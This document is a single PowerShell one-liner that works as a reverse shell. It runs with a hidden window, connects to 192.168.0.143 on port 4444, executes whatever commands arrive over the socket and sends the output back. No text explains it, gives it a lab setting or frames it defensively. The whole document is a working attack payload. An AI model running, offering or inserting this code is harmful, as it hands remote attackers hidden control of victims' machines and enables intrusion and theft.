powershell -WindowStyle hidden { iex('$c=New-Object Net.Sockets.TCPClient("192.168.0.143",4444);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){;$d=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0,$i);$o=(iex $d 2>&1|Out-String);$o2=$o+"PS "+(pwd).Path+"> ";$b=([text.encoding]::ASCII).GetBytes($o2);$s.Write($b,0,$b.Length);$s.Flush()};$c.Close()')}
